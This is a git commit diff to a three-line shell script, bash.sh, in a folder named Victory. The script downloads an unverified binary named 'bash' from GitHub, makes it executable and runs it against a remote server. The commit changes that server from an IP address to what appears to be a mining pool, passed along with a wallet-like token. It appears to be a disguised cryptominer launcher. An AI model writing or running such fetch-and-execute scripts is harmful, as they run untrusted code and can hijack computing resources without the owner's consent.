fcbeb151ae4d53e5cd882c4a8aa0f1f26246c6b1
jenifler <96619243+jenifler@users.noreply.github.com>
2022-02-10 20:30:43 +0700

    Update bash.sh

--- Victory/bash.sh
+++ Victory/bash.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://raw.githubusercontent.com/fahrah/latihan/main/bash 
 chmod +x bash 
-./bash run 104.22.65.205 EQBsPrcYWQwl9K-uiUoT3u2o0Eo1L6ckc5xo6-S0708xPEtd
+./bash run https://server1.whalestonpool.com EQBsPrcYWQwl9K-uiUoT3u2o0Eo1L6ckc5xo6-S0708xPEtd
